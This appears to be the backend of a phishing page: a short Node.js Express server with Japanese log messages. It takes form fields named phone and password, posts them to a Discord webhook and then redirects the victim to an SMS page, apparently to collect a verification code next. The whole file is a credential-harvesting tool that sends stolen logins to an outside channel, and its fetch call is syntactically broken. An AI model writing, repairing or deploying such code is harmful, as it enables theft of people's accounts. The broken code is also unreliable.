const express = require("express");

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.static("."));

const webhook = process.env.DISCORD_WEBHOOK;

app.post("/send", async (req, res) => {
  const phone = req.body.name;
  const password = req.body.message;

  try {
    await fetch(webhook, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
body: JSON.stringify({
  content: phone,
  message: password 
});
})


    console.log("送信成功");

    // 次の画面へ
    res.redirect("/sms.html");

  } catch (error) {
    console.error("送信失敗:", error);
    res.status(500).send("エラー");
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("Server started");
});
